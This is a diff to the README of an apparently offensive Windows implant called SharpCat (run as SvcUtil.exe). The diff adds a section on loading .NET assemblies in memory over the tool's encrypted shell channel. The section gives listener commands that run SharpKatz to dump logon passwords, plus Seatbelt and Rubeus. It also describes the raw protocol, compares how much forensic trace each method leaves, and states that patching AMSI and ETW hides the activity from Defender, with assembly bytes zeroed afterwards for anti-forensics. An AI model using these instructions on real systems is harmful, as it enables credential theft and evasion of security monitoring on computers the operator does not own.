@@ -317,7 +317,70 @@ SvcUtil.exe -i explorer -s encrypted.txt -p MyPassword123
 
 ---
 
-## 8. AMSI/ETW Bypass (How It Works)
+## 8. Execute-Assembly (In-Memory .NET Loading)
+
+**Theory:** Loads a .NET assembly (EXE) entirely in memory without touching disk. The assembly is transferred over the encrypted channel, loaded via `Assembly.Load(byte[])` in the SharpCat process, and its `Main()` is invoked with optional arguments. Because SharpCat's process already has AMSI and ETW patched, the loaded assembly is invisible to both — equivalent to Sliver's `execute-assembly` or Havoc's `dotnet inline-execute`, but without needing a full C2 framework.
+
+```
+  [Attacker]                              [Target]
+  listener.py                             SvcUtil.exe (shell session)
+      │                                       │
+      │  !localexec SharpKatz.exe --Command   │
+      │         logonpasswords                │
+      ├──────────────────────────────────────►│
+      │  !execute-assembly 45678 --Command    │
+      │         logonpasswords                │
+      │                                       ├─ AMSI/ETW already patched
+      │  READY                                │
+      │◄──────────────────────────────────────┤
+      │  <45678 bytes of assembly>            │
+      ├──────────────────────────────────────►│
+      │                                       ├─ Assembly.Load(bytes)
+      │                                       ├─ EntryPoint.Invoke(args)
+      │  [captured stdout/stderr output]      │
+      │◄──────────────────────────────────────┤
+      │  DONE: assembly executed successfully │
+      │◄──────────────────────────────────────┤
+```
+
+### From the listener (recommended)
+
+```bash
+# Load and execute SharpKatz in-memory on the target
+!localexec /path/to/SharpKatz.exe --Command logonpasswords
+
+# With arguments
+!localexec /path/to/Seatbelt.exe -group=all
+
+# Execute Rubeus
+!localexec /tools/Rubeus.exe triage
+```
+
+### Raw protocol (advanced — for custom tooling)
+
+```bash
+# From any client that speaks the SharpCat protocol:
+# Send: !execute-assembly <size_in_bytes> [args...]
+# Wait for: READY
+# Send: <raw assembly bytes>
+# Receive: output + DONE/ERR
+```
+
+### Key advantages over PowerShell reflection
+
+| | `!localexec` | PowerShell `Assembly.Load` |
+|---|---|---|
+| Disk touch | None | None |
+| AMSI | Pre-patched in process | Must bypass separately |
+| ScriptBlock Logging | Not applicable (no PowerShell) | Logs reflection commands |
+| Forensic trace | Minimal — no PowerShell artifacts | PowerShell event logs |
+| Crash isolation | Same process (crash = lost shell) | Same process |
+
+> **Note:** The loaded assembly runs in the same process as SharpCat. If it crashes, the shell session is lost. Assembly bytes are zeroed from memory after execution (anti-forensics).
+
+---
+
+## 9. AMSI/ETW Bypass (How It Works)
 
 **Theory:** When `-e powershell.exe` is used, SvcUtil automatically bypasses AMSI (Antimalware Scan Interface) and ETW (Event Tracing for Windows) to prevent Defender from scanning PowerShell commands and receiving telemetry events.
 
@@ -408,6 +471,7 @@ Program.cs           Entry point, argument parsing, mode dispatch
 │   ├── Crypto.cs          XOR rolling-key stream cipher
 │   ├── TlsStream.cs       SslStream wrapper — real TLS 1.2/1.3
 │   ├── FileTransfer.cs    !upload / !download protocol
+│   ├── AssemblyRunner.cs  !execute-assembly — in-memory .NET assembly loader
 │   └── ScanPatch.cs       AMSI/ETW bypass (local patch + stdin reflection)
 │
 ├── Shellcode Mode
@@ -425,6 +489,7 @@ Program.cs           Entry point, argument parsing, mode dispatch
 
 | Technique | Module | How it works |
 |-----------|--------|--------------|
+| Execute-Assembly | AssemblyRunner.cs | In-memory .NET assembly load via `Assembly.Load(byte[])` — no disk, no PowerShell |
 | Dynamic P/Invoke | DynInvoke.cs | Only LoadLibraryA/GetProcAddress in IAT — all other APIs resolved at runtime |
 | Indirect Syscalls | Syscall.cs | SSN from clean disk ntdll + jump through in-memory `syscall;ret` gadget |
 | Threadless Injection | RemoteLoader.cs | Thread execution hijacking — no CreateRemoteThread call |
